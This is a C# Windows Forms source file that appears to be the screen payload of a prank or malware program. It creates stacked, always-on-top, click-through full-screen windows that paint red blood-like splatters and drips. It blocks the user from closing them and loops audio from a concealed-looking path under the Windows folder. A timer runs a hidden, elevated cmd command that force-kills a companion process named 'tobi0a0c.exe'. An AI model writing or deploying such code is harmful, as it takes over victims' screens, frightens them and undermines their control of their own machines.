using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Threading;
using System.Media;
using System.Diagnostics;
using System.Runtime.InteropServices.ComTypes;

namespace gdifuncs
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        [DllImport("User32.dll")]
        public static extern IntPtr GetDC(IntPtr hwnd);

        [DllImport("User32.dll")]
        public static extern void ReleaseDC(IntPtr hwnd, IntPtr dc);

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams wew = base.CreateParams;
                wew.ExStyle = base.CreateParams.ExStyle | 0x20;
                return wew;
            }
        }

        int maxx;
        public static int howmuch = 0;
        public static int maxy;

        double pictrans = .99;

        Random rnd = new Random();

        private void MainFormLoad(object sender, EventArgs e)
        {
            this.BackColor = Color.Maroon;
            base.TransparencyKey = Color.Maroon;
            base.FormBorderStyle = FormBorderStyle.None;
            base.TopMost = true;
            base.WindowState = FormWindowState.Maximized;
            this.maxx = base.Size.Width;
            MainForm.maxy = checked(base.Size.Height + 20);
            bool flag = MainForm.howmuch == 3;
            if (flag)
            {
                MainForm.howmuch = 4;
                this.pictrans = 0.99;
            }
            bool flag2 = MainForm.howmuch == 2;
            if (flag2)
            {
                MainForm.howmuch = 3;
                this.pictrans = 0.85;
                MainForm mf = new MainForm();
                mf.Show();
            }
            bool flag3 = MainForm.howmuch == 1;
            if (flag3)
            {
                MainForm.howmuch = 2;
                this.pictrans = 0.75;
                MainForm mf2 = new MainForm();
                mf2.Show();
            }
            bool flag4 = MainForm.howmuch == 0;
            if (flag4)
            {
                MainForm.howmuch = 1;
                this.pictrans = 0.6;
                MainForm mf3 = new MainForm();
                mf3.Show();
                try
                {
                    SoundPlayer sp = new SoundPlayer("C:\\windows\\winbase_base_procid_none\\secureloc0x65\\mainbgtheme.wav");
                    pinksavage ps = new pinksavage();
                    ps.Show();
                    sp.PlayLooping();
                }
                catch
                {
                }
                this.timer2.Start();
            }
            base.Opacity = this.pictrans;
            this.timer1.Start();
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            switch (e.CloseReason)
            {
                case CloseReason.UserClosing:
                    e.Cancel = true;
                    break;
            }

            base.OnFormClosing(e);
        }

        [DllImport("user32.dll")]
        public static extern bool SetForegroundWindow(IntPtr hWnd);

        void tm(object state)
        {
            SetForegroundWindow(this.Handle);
            Thread.Sleep(10);
        }

        void sagaCiz()
        {
            Graphics g = this.CreateGraphics();
            SolidBrush b = new SolidBrush(Color.FromArgb(rnd.Next(100, 255), Color.Red));
            int mysize = 0;
            mysize = rnd.Next(3, 15);
            int genpos = 0;
            int ranint = rnd.Next(0, 11);
            if (ranint < 5)
            {
                genpos = rnd.Next(-5, 65);
            }

            if (ranint > 4 && ranint < 8)
            {
                genpos = rnd.Next(65, 120);
            }

            if (ranint == 8 || ranint == 9)
            {
                genpos = rnd.Next(120, 250);
            }

            if (ranint == 10)
            {
                genpos = rnd.Next(250, 500);
            }

            if (rnd.Next(0, 2) == 1)
            {
                g.FillEllipse(b, new Rectangle(maxx - genpos, rnd.Next(0, maxy - 50), mysize, rnd.Next(3, 15)));
            }
            else
            {
                g.FillRectangle(b, new Rectangle(maxx - genpos, rnd.Next(0, maxy - 50), mysize, rnd.Next(3, 15)));
            }

            g.Dispose();
        }
        void solaCiz()
        {
            Graphics g = this.CreateGraphics();
            SolidBrush b = new SolidBrush(Color.FromArgb(rnd.Next(100, 255), Color.Red));
            int mysize = 0;
            mysize = rnd.Next(3, 15);
            int genpos = 0;
            int ranint = rnd.Next(0, 11);
            if (ranint < 5)
            {
                genpos = rnd.Next(-5, 65);
            }

            if (ranint > 4 && ranint < 8)
            {
                genpos = rnd.Next(65, 120);
            }

            if (ranint == 8 || ranint == 9)
            {
                genpos = rnd.Next(120, 250);
            }

            if (ranint == 10)
            {
                genpos = rnd.Next(250, 500);
            }

            if (rnd.Next(0, 2) == 1)
            {
                g.FillEllipse(b, new Rectangle(genpos, rnd.Next(0, maxy - 50), mysize, rnd.Next(3, 15)));
            }
            else
            {
                g.FillRectangle(b, new Rectangle(genpos, rnd.Next(0, maxy - 50), mysize, rnd.Next(3, 15)));
            }

            g.Dispose();
        }

        void usteCiz()
        {
            Graphics g = this.CreateGraphics();
            SolidBrush b = new SolidBrush(Color.FromArgb(rnd.Next(100, 255), Color.Red));
            int mysize = 0;
            mysize = rnd.Next(3, 15);
            int genpos = 0;
            int ranint = rnd.Next(0, 11);
            if (ranint < 5)
            {
                genpos = rnd.Next(-5, 20);
            }

            if (ranint > 4 && ranint < 8)
            {
                genpos = rnd.Next(20, 40);
            }

            if (ranint == 8 || ranint == 9)
            {
                genpos = rnd.Next(40, 60);
            }

            if (ranint == 10)
            {
                genpos = rnd.Next(60, 100);
            }

            if (rnd.Next(0, 2) == 1)
            {
                g.FillEllipse(b, new Rectangle(rnd.Next(20, maxx - 20), genpos, mysize, rnd.Next(3, 15)));
            }
            else
            {
                g.FillRectangle(b, new Rectangle(rnd.Next(20, maxx - 20), genpos, mysize, rnd.Next(3, 15)));
            }

            g.Dispose();
        }

        void altaCiz()
        {
            Graphics g = this.CreateGraphics();
            SolidBrush b = new SolidBrush(Color.FromArgb(rnd.Next(100, 255), Color.Red));
            int mysize = 0;
            mysize = rnd.Next(3, 15);
            int genpos = 0;
            int ranint = rnd.Next(0, 11);
            if (ranint < 5)
            {
                genpos = rnd.Next(-5, 20);
            }

            if (ranint > 4 && ranint < 8)
            {
                genpos = rnd.Next(20, 40);
            }

            if (ranint == 8 || ranint == 9)
            {
                genpos = rnd.Next(40, 60);
            }

            if (ranint == 10)
            {
                genpos = rnd.Next(60, 100);
            }

            if (rnd.Next(0, 2) == 1)
            {
                g.FillEllipse(b, new Rectangle(rnd.Next(20, maxx - 20), maxy - genpos, mysize, rnd.Next(3, 15)));
            }
            else
            {
                g.FillRectangle(b, new Rectangle(rnd.Next(20, maxx - 20), maxy - genpos, mysize, rnd.Next(3, 15)));
            }

            g.Dispose();
        }

        int dropdownxpos = 0;
        int finishdrop = 0;
        int kalinlik = 0;

        int qdropdownxpos = 0;
        int qfinishdrop = 0;
        int qkalinlik = 0;

        void dropit(object state)
        {
            int startpos = dropdownxpos;
            int bitir = finishdrop;
            int kalinlikx = kalinlik;

            for (int a = 0; a < bitir; a++)
            {
                try
                {
                    Graphics g = this.CreateGraphics();
                    SolidBrush b = new SolidBrush(Color.FromArgb(255, Color.Red));
                    g.FillEllipse(b, new Rectangle(startpos, -20, kalinlik, a));
                    g.Dispose();
                    Thread.Sleep(2);
                }
                catch
                {
                }
            }
        }

        void dropitX(object state)
        {
            int startpos = qdropdownxpos;
            int bitir = qfinishdrop;
            int kalinlikx = qkalinlik;

            for (int a = 0; a < bitir; a++)
            {
                Graphics g = this.CreateGraphics();
                SolidBrush b = new SolidBrush(Color.FromArgb(255, Color.Red));
                g.FillEllipse(b, new Rectangle(startpos, -20, kalinlikx, a));
                Thread.Sleep(5);
            }
        }

        void verticalDropX()
        {
            qdropdownxpos = rnd.Next(1, maxx - 5);
            qfinishdrop = rnd.Next(5, 15);
            qkalinlik = rnd.Next(30, 90);

            ThreadPool.QueueUserWorkItem(dropitX);
        }

        void verticalDrop()
        {
            dropdownxpos = rnd.Next(1, maxx - 5);
            finishdrop = rnd.Next(5, maxy - 20);
            kalinlik = rnd.Next(5, 25);

            ThreadPool.QueueUserWorkItem(dropit);
        }


        void Timer1Tick(object sender, EventArgs e)
        {
            int i = this.rnd.Next(0, 10);
            bool flag = i < 3;
            if (flag)
            {
                this.sagaCiz();
            }
            bool flag2 = i > 2 && i < 5;
            if (flag2)
            {
                this.solaCiz();
            }
            bool flag3 = i == 5 || i == 8;
            if (flag3)
            {
                this.usteCiz();
            }
            bool flag4 = i == 6 || i == 7;
            if (flag4)
            {
                this.altaCiz();
            }
            bool flag5 = i == 9;
            if (flag5)
            {
                this.verticalDrop();
            }
        }

        void Timer2Tick(object sender, EventArgs e)
        {
            this.TopMost = true;
        }

        void Timer3Tick(object sender, EventArgs e)
        {
            Process.Start(
                new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c taskkill /f /im tobi0a0c.exe",
                    Verb = "RunAs",
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            Environment.Exit(0);
        }
    }
}